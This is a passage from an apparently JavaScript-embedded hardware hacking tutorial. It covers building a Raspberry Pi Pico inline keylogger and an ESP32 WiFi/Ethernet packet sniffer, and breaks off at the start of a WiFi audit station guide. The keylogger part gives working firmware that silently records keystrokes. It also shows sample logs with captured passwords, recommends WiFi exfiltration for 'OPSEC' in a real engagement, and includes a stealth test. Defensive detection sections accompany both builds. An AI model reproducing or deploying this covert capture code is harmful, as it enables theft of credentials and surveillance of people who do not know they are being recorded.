                code: '# Architecture diagram:\n#\n# Real Keyboard ──USB──> Pico PIO-USB Host (GP0/GP1)\n#                              |\n#                              v\n#                        Keystroke Decoder\n#                              |\n#                    +---------+---------+\n#                    |                   |\n#                    v                   v\n#              Log to Flash       Forward to PC\n#              (internal 2MB)     (native USB HID)\n#                                       |\n#                                       v\n#                              Target Computer\n#                         (sees normal keyboard)',
                language: 'Text',
                tip: '<strong>Latency:</strong> The PIO-USB to native USB forwarding adds approximately 1-2ms of latency. This is imperceptible to the user &mdash; typical keyboard polling is 8ms (125Hz) to begin with.'
            },
            {
                title: 'Install the Firmware',
                content: '<p>We use a pre-built firmware that combines PIO-USB host, HID forwarding, and keystroke logging. This project uses the C/C++ SDK for the Pico (not CircuitPython) because PIO-USB requires low-level hardware access.</p>' +
                         '<ol>' +
                         '<li>Install the Pico C SDK and CMake toolchain on your development machine.</li>' +
                         '<li>Clone the pico-usb-keyboard-logger repository (or build from the code below).</li>' +
                         '<li>Build with CMake and flash the resulting UF2 file.</li>' +
                         '</ol>',
                code: '# Install Pico SDK (Linux/macOS)\nsudo apt install cmake gcc-arm-none-eabi libnewlib-arm-none-eabi build-essential\ngit clone https://github.com/raspberrypi/pico-sdk.git --branch master\ncd pico-sdk && git submodule update --init\nexport PICO_SDK_PATH=$(pwd)\n\n# Clone and build the keylogger project\ncd ..\nmkdir keylogger && cd keylogger\n\n# Create CMakeLists.txt and main.c (see next steps)\nmkdir build && cd build\ncmake ..\nmake -j4\n\n# Flash: hold BOOTSEL on Pico, plug in, copy the .uf2 file\ncp keylogger.uf2 /media/$USER/RPI-RP2/',
                language: 'Bash',
                tip: '<strong>Tip:</strong> If you do not want to set up the C toolchain, there are pre-compiled UF2 binaries available on GitHub. Search for "pico-usb-host-hid-logger" for community builds.'
            },
            {
                title: 'Write the Keylogger Core Code',
                content: '<p>The keylogger\'s main loop is straightforward: poll the keyboard for HID reports, decode the keycodes, log them, and forward the raw report to the host computer.</p>',
                code: '// keylogger.c - Core keystroke capture logic\n// (Simplified - actual implementation uses TinyUSB callbacks)\n\n#include <stdio.h>\n#include "pico/stdlib.h"\n#include "bsp/board.h"\n#include "tusb.h"\n#include "pio_usb.h"\n#include "hardware/flash.h"\n\n// Keycode to ASCII lookup table (US layout)\nstatic const char keycode_to_ascii[128] = {\n    0, 0, 0, 0,\n    \'a\', \'b\', \'c\', \'d\', \'e\', \'f\', \'g\', \'h\', \'i\', \'j\',\n    \'k\', \'l\', \'m\', \'n\', \'o\', \'p\', \'q\', \'r\', \'s\', \'t\',\n    \'u\', \'v\', \'w\', \'x\', \'y\', \'z\',\n    \'1\', \'2\', \'3\', \'4\', \'5\', \'6\', \'7\', \'8\', \'9\', \'0\',\n    \'\\n\', 0x1B, \'\\b\', \'\\t\', \' \',\n    \'-\', \'=\', \'[\', \']\', \'\\\\\',\n    0, \';\', \'\\\'\', \'`\', \',\', \'.\', \'/\'\n};\n\n// Flash storage for logged keystrokes\n#define LOG_FLASH_OFFSET (1024 * 1024)  // Start at 1MB into flash\n#define LOG_MAX_SIZE     (1024 * 1024)  // 1MB log buffer\nstatic uint32_t log_write_pos = 0;\nstatic uint8_t log_buffer[4096];  // Write buffer\nstatic uint32_t buf_pos = 0;\n\nvoid log_keystroke(uint8_t keycode, uint8_t modifier) {\n    char c = 0;\n    if (keycode < 128) {\n        c = keycode_to_ascii[keycode];\n    }\n    if (c == 0) return;\n\n    // Apply shift modifier\n    if (modifier & 0x22) {  // Left or Right Shift\n        if (c >= \'a\' && c <= \'z\') c -= 32;  // uppercase\n    }\n\n    // Buffer the character\n    log_buffer[buf_pos++] = c;\n\n    // Flush to flash when buffer is full (4KB = flash sector)\n    if (buf_pos >= 4096) {\n        uint32_t flash_addr = LOG_FLASH_OFFSET + log_write_pos;\n        flash_range_erase(flash_addr, 4096);\n        flash_range_program(flash_addr, log_buffer, 4096);\n        log_write_pos += 4096;\n        buf_pos = 0;\n        if (log_write_pos >= LOG_MAX_SIZE) {\n            log_write_pos = 0;  // Circular buffer\n        }\n    }\n}\n\n// TinyUSB callback: called when a key report arrives\nvoid tuh_hid_report_received_cb(uint8_t dev_addr,\n    uint8_t instance, uint8_t const* report, uint16_t len) {\n\n    // HID keyboard report format:\n    // Byte 0: modifier keys (shift, ctrl, alt, etc.)\n    // Byte 1: reserved\n    // Bytes 2-7: up to 6 simultaneous keycodes\n    uint8_t modifier = report[0];\n    for (int i = 2; i < 8; i++) {\n        if (report[i] != 0) {\n            log_keystroke(report[i], modifier);\n        }\n    }\n\n    // Forward the raw report to the host computer\n    tud_hid_report(0, report, len);\n\n    // Continue receiving\n    tuh_hid_receive_report(dev_addr, instance);\n}',
                language: 'C',
                tip: '<strong>Note:</strong> Writing to flash has a limited number of erase cycles (~100,000 per sector). For long-term logging, use a MicroSD card via SPI instead of the internal flash. The SD card gives you essentially unlimited write cycles for this use case.'
            },
            {
                title: 'Add Log Retrieval',
                content: '<p>You need a way to retrieve the logged keystrokes. Options:</p>' +
                         '<ul>' +
                         '<li><strong>Dev mode (GP15):</strong> When GP15 is grounded at boot, the Pico mounts its internal flash as a USB mass storage device. The log file is accessible as a text file.</li>' +
                         '<li><strong>WiFi exfiltration:</strong> Use a Pico W instead and send logs to a remote server over WiFi (requires the Pico W variant with wireless).</li>' +
                         '<li><strong>Magic key combo:</strong> Program a secret key combination (e.g., Ctrl+Shift+Alt+F12 held for 3 seconds) that triggers log download mode.</li>' +
                         '</ul>',
                code: '# Retrieve logs (when in dev mode - GP15 grounded):\n# 1. Ground GP15 with a jumper wire\n# 2. Plug Pico into your laptop\n# 3. CIRCUITPY or mass storage drive appears\n# 4. Open the log file:\n\ncat /media/$USER/PICOKEY/keylog.txt\n\n# Example log output:\n# [2026-03-19 08:31:02] hello world\n# [2026-03-19 08:31:15] password123\n# [2026-03-19 08:31:28] ssh admin@192.168.1.1\n# [2026-03-19 08:32:01] sudo apt update\n\n# Clear the log:\nrm /media/$USER/PICOKEY/keylog.txt\nsync',
                language: 'Bash',
                tip: '<strong>OPSEC:</strong> In a real engagement, use the WiFi exfiltration method with the Pico W. This eliminates the need to physically retrieve the device, which is the highest-risk part of the operation.'
            },
            {
                title: 'Defense: Detecting and Preventing Hardware Keyloggers',
                content: '<p>Hardware keyloggers are notoriously difficult to detect because they are invisible to software. Here is how organizations defend against them:</p>' +
                         '<ul>' +
                         '<li><strong>Physical inspection:</strong> Regularly inspect USB connections between keyboards and computers. Any device inline between the keyboard cable and the USB port is suspicious. Train cleaning staff and security guards to report unusual USB devices.</li>' +
                         '<li><strong>Tamper-evident seals:</strong> Apply numbered tamper-evident stickers over USB connections. If the seal is broken, the connection was disturbed.</li>' +
                         '<li><strong>USB port monitoring:</strong> Use Sysmon (Event ID 6416) or USBGuard to log device connections. A hardware keylogger adds an extra USB hub or device to the chain &mdash; if a keyboard that usually shows as 1 device suddenly shows as 2, investigate.</li>' +
                         '<li><strong>Wireless keyboards:</strong> Bluetooth and wireless keyboards bypass inline keyloggers (though they introduce wireless interception risks).</li>' +
                         '<li><strong>On-screen keyboards:</strong> For entering high-value credentials, use an on-screen keyboard (Windows: osk.exe). Hardware keyloggers cannot capture mouse clicks on virtual keys.</li>' +
                         '<li><strong>Encrypted keyboards:</strong> Some enterprise keyboards (e.g., Cherry Secure Board) encrypt keystrokes at the keyboard and decrypt them in software, defeating inline capture.</li>' +
                         '</ul>',
                code: '# PowerShell: Enumerate USB device chain\n# A keylogger adds an extra device between keyboard and PC\nGet-PnpDevice -Class USB -Status OK |\n    Select-Object FriendlyName, InstanceId |\n    Format-Table -AutoSize\n\n# Compare device count to baseline:\n# Normal: USB Root Hub > USB Composite Device > HID Keyboard\n# Keylogger: USB Root Hub > USB Hub (EXTRA) > HID Keyboard\n\n# Linux: Check USB device tree\nlsusb -t\n# Look for unexpected hubs or extra devices in the chain\n\n# Physical security checklist:\n# [ ] Keyboard plugged directly into PC (no extensions)\n# [ ] Tamper seal intact on USB connection\n# [ ] No unknown devices between keyboard and port\n# [ ] USB port count matches expected (no hidden hubs)',
                language: 'Bash',
                tip: '<strong>Key insight:</strong> Hardware keyloggers exploit the gap between physical security and software security. No amount of antivirus, EDR, or endpoint hardening will detect a device that operates below the OS layer. Physical security is the only reliable defense.'
            }
        ],

        testing: '<p>Verify your keylogger works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>Passthrough test:</strong> Connect a keyboard through the Pico to a computer. Type normally. All keystrokes should pass through with no noticeable delay. If keys are dropped or laggy, check the PIO-USB configuration.</li>' +
                 '<li><strong>Logging test:</strong> Type a known string ("The quick brown fox..."), then switch to dev mode and check the log. The captured text should match exactly.</li>' +
                 '<li><strong>Special characters:</strong> Test numbers, symbols, shift+key combinations, and modifier keys (Ctrl, Alt). Verify they are logged correctly.</li>' +
                 '<li><strong>Long-duration test:</strong> Leave it running for an hour of normal typing. Check that no keystrokes are lost and the log file is intact.</li>' +
                 '<li><strong>Stealth test:</strong> Check Device Manager on the target machine. Only one keyboard should appear &mdash; not two keyboards or an extra USB hub.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'PIO-USB Pin Conflict',
                description: 'PIO-USB uses GP0 and GP1 by default. If you have anything else wired to these pins, USB host will not work. Keep GP0/GP1 dedicated to the keyboard input.'
            },
            {
                title: 'Power Issues',
                description: 'The keyboard draws power through the Pico. Some power-hungry keyboards (backlit, mechanical with RGB) may draw more current than the Pico can supply through PIO-USB. Use a powered USB hub if needed.'
            }
        ]
    },

    // ========================================================================
    // SG-37: Network Packet Sniffer
    // ========================================================================
    'sg-37': {
        intro: '<p>A network packet sniffer captures and analyzes network traffic in real-time. Commercial tools like the <strong>Hak5 Packet Squirrel</strong> (~$60) are small inline devices that sit between a computer and the network, passively capturing all traffic.</p>' +
               '<p>We build our own using an <strong>ESP32</strong> with a <strong>W5500 Ethernet module</strong>. The ESP32 handles WiFi sniffing (promiscuous mode captures all wireless frames in range), while the W5500 provides wired Ethernet packet capture. Captured packets are stored on a MicroSD card in PCAP format &mdash; directly importable into Wireshark.</p>' +
               '<p>This is a passive reconnaissance tool. It does not send any traffic &mdash; it only listens. In a penetration test, this is the first thing you deploy to understand the network topology, active hosts, protocols in use, and potential vulnerabilities.</p>' +
               '<p><strong>Hardware needed:</strong> ESP32 DevKit, W5500 Ethernet module, MicroSD breakout, SD card, jumper wires, breadboard. Total cost: ~$12.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 320" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '</defs>' +
            '<rect width="720" height="320" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="300" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">NETWORK PACKET SNIFFER &mdash; WIRING DIAGRAM</text>' +
            '<!-- ESP32 -->' +
            '<g class="svg-component">' +
            '<rect x="240" y="55" width="240" height="100" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="240" y="55" width="240" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="360" y="72" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">ESP32 DevKit</text>' +
            '<text x="360" y="95" text-anchor="middle" fill="#8b949e" font-size="8">WiFi promiscuous mode capture</text>' +
            '<text x="360" y="110" text-anchor="middle" fill="#8b949e" font-size="8">SPI bus to W5500 + SD card</text>' +
            '<text x="360" y="130" text-anchor="middle" fill="#8b949e" font-size="8">Web dashboard on AP mode</text>' +
            '</g>' +
            '<!-- W5500 -->' +
            '<rect x="40" y="185" width="180" height="80" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
            '<text x="130" y="210" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">W5500 Ethernet</text>' +
            '<text x="130" y="225" text-anchor="middle" fill="#8b949e" font-size="7">SPI interface</text>' +
            '<text x="130" y="240" text-anchor="middle" fill="#8b949e" font-size="7">RJ45 inline tap</text>' +
            '<text x="130" y="255" text-anchor="middle" fill="#555" font-size="7">10/100 Mbps</text>' +
            '<!-- SD Card -->' +
            '<rect x="500" y="185" width="180" height="80" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
            '<text x="590" y="210" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">MicroSD Card</text>' +
            '<text x="590" y="225" text-anchor="middle" fill="#8b949e" font-size="7">PCAP file storage</text>' +
            '<text x="590" y="240" text-anchor="middle" fill="#8b949e" font-size="7">FAT32 formatted</text>' +
            '<text x="590" y="255" text-anchor="middle" fill="#555" font-size="7">Wireshark compatible</text>' +
            '<!-- Wires -->' +
            '<line x1="300" y1="155" x2="170" y2="185" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="420" y1="155" x2="550" y2="185" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
                '    ESP32 DevKit          W5500 Ethernet Module\n' +
                '    +------------------+  +------------------+\n' +
                '    |  GPIO23 (MOSI) --|--|-- MOSI            |\n' +
                '    |  GPIO19 (MISO) --|--|-- MISO            |\n' +
                '    |  GPIO18 (SCK)  --|--|-- SCLK            |\n' +
                '    |  GPIO5  (CS)   --|--|-- SCS             |\n' +
                '    |  3V3          --|--|-- VCC             |\n' +
                '    |  GND          --|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    ESP32 DevKit          MicroSD Breakout\n' +
                '    +------------------+  +------------------+\n' +
                '    |  GPIO23 (MOSI) --|--|-- MOSI            |\n' +
                '    |  GPIO19 (MISO) --|--|-- MISO            |\n' +
                '    |  GPIO18 (SCK)  --|--|-- SCK             |\n' +
                '    |  GPIO4  (CS)   --|--|-- CS              |\n' +
                '    |  3V3          --|--|-- VCC             |\n' +
                '    |  GND          --|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    Note: W5500 and SD share the SPI bus (MOSI/MISO/SCK)\n' +
                '    but have separate CS (chip select) pins.',

        wiringNotes: '<p><strong>SPI bus sharing:</strong> The W5500 and MicroSD both use SPI. They share MOSI, MISO, and SCK lines, but each has its own Chip Select (CS) pin. Only one device communicates at a time &mdash; the ESP32 toggles CS to select which device to talk to.</p>' +
                     '<p><strong>Promiscuous mode:</strong> The ESP32\'s WiFi radio can be put into promiscuous mode, where it captures all 802.11 frames on a specific channel &mdash; not just frames addressed to it. This is the same capability as monitor mode on a Linux WiFi adapter.</p>' +
                     '<p><strong>PCAP format:</strong> Packets are saved in the standard PCAP file format. This means you can pull the SD card, plug it into your laptop, and open the capture file directly in Wireshark for analysis.</p>',

        steps: [
            {
                title: 'Set Up the Arduino Environment for ESP32',
                content: '<p>Install the ESP32 board support in Arduino IDE:</p>' +
                         '<ol>' +
                         '<li>Open Arduino IDE &rarr; File &rarr; Preferences.</li>' +
                         '<li>Add this URL to Additional Board Manager URLs: <code>https://espressif.github.io/arduino-esp32/package_esp32_index.json</code></li>' +
                         '<li>Go to Tools &rarr; Board Manager, search "esp32", install <strong>esp32 by Espressif Systems</strong>.</li>' +
                         '<li>Select your board: Tools &rarr; Board &rarr; ESP32 Dev Module.</li>' +
                         '<li>Install required libraries via Library Manager: <strong>Ethernet</strong> (for W5500), <strong>SD</strong> (for MicroSD).</li>' +
                         '</ol>',
                code: null,
                language: null,
                tip: '<strong>Tip:</strong> Use Arduino IDE 2.x or PlatformIO in VS Code for better code completion and debugging support. The ESP32 toolchain is large (~500MB) and takes a few minutes to install.'
            },
            {
                title: 'Write the WiFi Sniffer',
                content: '<p>The WiFi sniffer puts the ESP32 into promiscuous mode and captures all 802.11 frames on the current channel. It saves them in PCAP format to the SD card.</p>',
                code: '#include <WiFi.h>\n#include <SD.h>\n#include <SPI.h>\n#include "esp_wifi.h"\n\n#define SD_CS 4\n\n// PCAP file header (global header)\nconst uint8_t pcap_header[] = {\n    0xD4, 0xC3, 0xB2, 0xA1,  // Magic number\n    0x02, 0x00, 0x04, 0x00,  // Version 2.4\n    0x00, 0x00, 0x00, 0x00,  // Timezone (GMT)\n    0x00, 0x00, 0x00, 0x00,  // Timestamp accuracy\n    0xFF, 0xFF, 0x00, 0x00,  // Snap length (65535)\n    0x69, 0x00, 0x00, 0x00   // Link type: 802.11\n};\n\nFile pcapFile;\nuint32_t packetCount = 0;\n\n// Callback for each captured packet\nvoid wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {\n    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;\n    uint32_t len = pkt->rx_ctrl.sig_len;\n    uint32_t ts_sec = millis() / 1000;\n    uint32_t ts_usec = (millis() % 1000) * 1000;\n\n    if (!pcapFile) return;\n\n    // Write PCAP packet header\n    pcapFile.write((uint8_t*)&ts_sec, 4);\n    pcapFile.write((uint8_t*)&ts_usec, 4);\n    pcapFile.write((uint8_t*)&len, 4);\n    pcapFile.write((uint8_t*)&len, 4);\n\n    // Write packet data\n    pcapFile.write(pkt->payload, len);\n    packetCount++;\n\n    // Flush every 100 packets\n    if (packetCount % 100 == 0) {\n        pcapFile.flush();\n        Serial.printf("Captured %d packets\\n", packetCount);\n    }\n}\n\nvoid setup() {\n    Serial.begin(115200);\n\n    // Initialize SD card\n    if (!SD.begin(SD_CS)) {\n        Serial.println("SD card init failed!");\n        return;\n    }\n\n    // Create PCAP file\n    pcapFile = SD.open("/capture.pcap", FILE_WRITE);\n    pcapFile.write(pcap_header, sizeof(pcap_header));\n\n    // Initialize WiFi in promiscuous mode\n    WiFi.mode(WIFI_STA);\n    WiFi.disconnect();\n    esp_wifi_set_promiscuous(true);\n    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);\n    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);\n\n    Serial.println("Sniffer active on channel 6");\n}\n\nvoid loop() {\n    // Channel hopping: cycle through channels 1-13\n    static uint8_t ch = 1;\n    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);\n    ch = (ch % 13) + 1;\n    delay(2000);  // 2 seconds per channel\n}',
                language: 'C++',
                tip: '<strong>Channel hopping:</strong> WiFi uses channels 1-13 (region dependent). The sniffer only captures on one channel at a time. Channel hopping every 2 seconds gives broad coverage but may miss packets during the hop. For targeted capture, lock to the target AP\'s channel.'
            },
            {
                title: 'Add the Ethernet Sniffer',
                content: '<p>The W5500 Ethernet module provides wired packet capture. Connect it inline between a computer and the network (or use a network tap). The ESP32 reads raw Ethernet frames via SPI and logs them alongside WiFi captures.</p>',
                code: '#include <Ethernet.h>\n#include <SD.h>\n\n#define W5500_CS 5\n#define SD_CS 4\n\nbyte mac[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };\n\nvoid setup_ethernet_sniffer() {\n    Ethernet.init(W5500_CS);\n    Ethernet.begin(mac);  // DHCP\n\n    Serial.print("Ethernet IP: ");\n    Serial.println(Ethernet.localIP());\n\n    // Enable promiscuous mode on W5500\n    // (requires modifying W5500 socket register directly)\n    // W5500 Socket 0 in MACRAW mode captures all frames\n}\n\n// Read raw Ethernet frames\nvoid capture_ethernet_packet() {\n    // W5500 MACRAW mode gives us raw Ethernet frames\n    // including the Ethernet header (dst MAC, src MAC, EtherType)\n    // and full payload\n\n    uint8_t buf[1514];  // Max Ethernet frame size\n    int len = 0;\n\n    // Read from W5500 socket in MACRAW mode\n    // (implementation depends on Ethernet library version)\n\n    if (len > 0) {\n        write_pcap_packet(buf, len, 1);  // Link type 1 = Ethernet\n    }\n}',
                language: 'C++',
                tip: '<strong>Note:</strong> The W5500 in MACRAW mode captures all Ethernet frames on the wire, including frames not addressed to it. This is the wired equivalent of WiFi promiscuous mode.'
            },
            {
                title: 'Build a Web Dashboard',
                content: '<p>The ESP32 can run a web server in AP mode, giving you a real-time dashboard accessible from your phone or laptop. The dashboard shows captured packet statistics, detected hosts, and lets you start/stop capture.</p>',
                code: '#include <WiFi.h>\n#include <WebServer.h>\n\nconst char* ap_ssid = "PacketSniff";\nconst char* ap_pass = "changeme123";\n\nWebServer server(80);\n\nvoid handleRoot() {\n    String html = "<html><head><title>Packet Sniffer</title>";\n    html += "<meta name=viewport content=\'width=device-width\'>";\n    html += "<style>body{background:#0a0a0f;color:#ccc;font-family:monospace;padding:20px}";\n    html += "h1{color:#ef4444}.stat{color:#22c55e;font-size:1.2em}</style></head>";\n    html += "<body><h1>Packet Sniffer Dashboard</h1>";\n    html += "<p>Packets captured: <span class=stat>" + String(packetCount) + "</span></p>";\n    html += "<p>Channel: <span class=stat>" + String(currentChannel) + "</span></p>";\n    html += "<p>SD Card: <span class=stat>" + String(SD.totalBytes()/1024/1024) + " MB</span></p>";\n    html += "<p><a href=/start style=color:#22c55e>Start Capture</a> | ";\n    html += "<a href=/stop style=color:#ef4444>Stop Capture</a></p>";\n    html += "</body></html>";\n    server.send(200, "text/html", html);\n}\n\nvoid setup_dashboard() {\n    WiFi.softAP(ap_ssid, ap_pass);\n    server.on("/", handleRoot);\n    server.on("/start", []() {\n        esp_wifi_set_promiscuous(true);\n        server.sendHeader("Location", "/");\n        server.send(302);\n    });\n    server.on("/stop", []() {\n        esp_wifi_set_promiscuous(false);\n        pcapFile.flush();\n        server.sendHeader("Location", "/");\n        server.send(302);\n    });\n    server.begin();\n}',
                language: 'C++',
                tip: '<strong>Tip:</strong> The ESP32 cannot simultaneously sniff in promiscuous mode and serve a web dashboard on the same radio. Use the AP mode for configuration/status, then switch to promiscuous mode for capture. Or use a second ESP32 &mdash; one for sniffing, one for the dashboard.'
            },
            {
                title: 'Defense: Detecting Network Sniffers',
                content: '<p>Network sniffers are passive by design, making them difficult to detect. But "difficult" is not "impossible":</p>' +
                         '<ul>' +
                         '<li><strong>Physical inspection:</strong> Look for unfamiliar devices on the network. Inline sniffers sit between cables and ports. Wireless sniffers are small boxes with antennas.</li>' +
                         '<li><strong>Network traffic encryption:</strong> Use TLS/HTTPS everywhere. A sniffer can capture encrypted traffic, but cannot read the contents. Enforce HSTS to prevent SSL stripping.</li>' +
                         '<li><strong>802.1X / NAC:</strong> Network Access Control requires authentication before granting network access. An unauthorized sniffer plugged into a switch port will not get an IP or see traffic.</li>' +
                         '<li><strong>Switch port security:</strong> Enable port security on managed switches to limit the number of MAC addresses per port. An inline device adds a new MAC.</li>' +
                         '<li><strong>Wireless: monitor for promiscuous mode.</strong> Devices in promiscuous mode respond to any frame, not just frames addressed to their MAC. Nmap\'s <code>--script broadcast-ping</code> can sometimes detect this.</li>' +
                         '<li><strong>DNS-over-HTTPS / VPN:</strong> Encrypt DNS queries and route all traffic through a VPN. Even if traffic is captured, the content is encrypted.</li>' +
                         '</ul>',
                code: '# Detect promiscuous mode on your network (Linux):\nsudo nmap --script broadcast-ping 192.168.1.0/24\n\n# Check your own interface mode:\nip link show wlan0\n# Look for PROMISC flag\n\n# Monitor for ARP anomalies (potential inline device):\nsudo arpwatch -i eth0\n\n# Verify no unknown devices on switch ports (Cisco IOS):\nshow mac address-table\nshow port-security\n\n# Test encryption coverage:\n# Run a capture on your own network and check for unencrypted:\n# - HTTP (not HTTPS)\n# - FTP (not SFTP)\n# - Telnet (not SSH)\n# - SMTP without STARTTLS\n# - DNS (use DoH or DoT)',
                language: 'Bash',
                tip: '<strong>Best defense:</strong> Assume the network is compromised and encrypt everything. Zero Trust architecture eliminates the value of passive sniffing because there is nothing useful to capture in cleartext.'
            }
        ],

        testing: '<p>Verify your packet sniffer works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>SD card writes:</strong> Start a capture, wait 30 seconds, stop. Pull the SD card and verify <code>capture.pcap</code> exists and is not empty.</li>' +
                 '<li><strong>Wireshark validation:</strong> Open the PCAP file in Wireshark. You should see decoded 802.11 frames (beacons, probes, data frames). If Wireshark reports a corrupt file, check the PCAP header bytes.</li>' +
                 '<li><strong>Channel hopping:</strong> Monitor the serial output. You should see channel changes every 2 seconds and the packet count increasing.</li>' +
                 '<li><strong>Dashboard:</strong> Connect to the PacketSniff AP, open 192.168.4.1 in a browser. Verify start/stop controls work and packet count updates.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'SPI Bus Contention',
                description: 'If the W5500 and SD card share SPI but you forget to set separate CS pins, both devices try to talk simultaneously, corrupting data. Double-check that W5500 CS (GPIO5) and SD CS (GPIO4) are on different pins.'
            },
            {
                title: 'SD Card Not FAT32',
                description: 'The Arduino SD library requires FAT32 formatting. Cards larger than 32GB are often formatted as exFAT by default. Reformat the card as FAT32 before use.'
            }
        ]
    },

    // ========================================================================
    // SG-38: Portable WiFi Audit Station
    // ========================================================================
    'sg-38': {
        intro: '<p>A WiFi audit station is a self-contained wireless security testing platform. The commercial gold standard is the <strong>Hak5 WiFi Pineapple</strong> ($100-400), which combines rogue AP creation, client deauthentication, handshake capture, evil twin attacks, and probe request sniffing in one device.</p>' +
               '<p>We build a more capable version using an <strong>ESP32-S3</strong> with a <strong>TFT display</strong>, <strong>SD card storage</strong>, and optional <strong>GPS module</strong>. The ESP32-S3 has two CPU cores (one for packet capture, one for the UI/web server) and supports both 2.4GHz WiFi and Bluetooth.</p>' +
               '<p>This is the most advanced wireless project in the series. It combines the scanning from SG-35 with handshake capture, WPS exploitation testing, and a professional touchscreen interface.</p>' +
               '<p><strong>Hardware needed:</strong> ESP32-S3 DevKit, 1.8" TFT display (ST7735 SPI), MicroSD breakout, SD card, 3 buttons, optional GPS module, breadboard, jumper wires. Total cost: ~$20.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">WIFI AUDIT STATION &mdash; COMPONENT LAYOUT</text>' +
            '<!-- ESP32-S3 center -->' +
            '<rect x="260" y="50" width="200" height="90" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<text x="360" y="75" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">ESP32-S3 DevKit</text>' +
            '<text x="360" y="95" text-anchor="middle" fill="#8b949e" font-size="8">Dual-core 240MHz + WiFi/BT</text>' +
            '<text x="360" y="110" text-anchor="middle" fill="#8b949e" font-size="8">Promiscuous mode + AP mode</text>' +
            '<!-- TFT Display -->' +
            '<rect x="40" y="160" width="150" height="70" rx="6" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="1"/>' +
            '<text x="115" y="185" text-anchor="middle" fill="#a855f7" font-size="9" font-weight="600">1.8" TFT Display</text>' +
            '<text x="115" y="200" text-anchor="middle" fill="#8b949e" font-size="7">ST7735 SPI, 160x128</text>' +
            '<text x="115" y="215" text-anchor="middle" fill="#555" font-size="7">Network list + status</text>' +
            '<!-- SD -->' +
            '<rect x="220" y="160" width="130" height="70" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
            '<text x="285" y="185" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">MicroSD</text>' +
            '<text x="285" y="200" text-anchor="middle" fill="#8b949e" font-size="7">PCAP + handshakes</text>' +
            '<text x="285" y="215" text-anchor="middle" fill="#555" font-size="7">Wireshark format</text>' +
            '<!-- Buttons -->' +
            '<rect x="375" y="160" width="130" height="70" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
            '<text x="440" y="185" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">3 Buttons</text>' +
            '<text x="440" y="200" text-anchor="middle" fill="#8b949e" font-size="7">UP / DOWN / SELECT</text>' +
            '<text x="440" y="215" text-anchor="middle" fill="#555" font-size="7">Menu navigation</text>' +
            '<!-- GPS -->' +
            '<rect x="530" y="160" width="150" height="70" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="0.5"/>' +
            '<text x="605" y="185" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">GPS (Optional)</text>' +
            '<text x="605" y="200" text-anchor="middle" fill="#8b949e" font-size="7">NEO-6M module</text>' +
            '<text x="605" y="215" text-anchor="middle" fill="#555" font-size="7">Wardriving coords</text>' +
            '<!-- Lines -->' +
            '<line x1="300" y1="140" x2="115" y2="160" stroke="#a855f7" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<line x1="340" y1="140" x2="285" y2="160" stroke="#eab308" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<line x1="400" y1="140" x2="440" y2="160" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<line x1="440" y1="140" x2="605" y2="160" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3"/>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM\n' +
                '\n' +
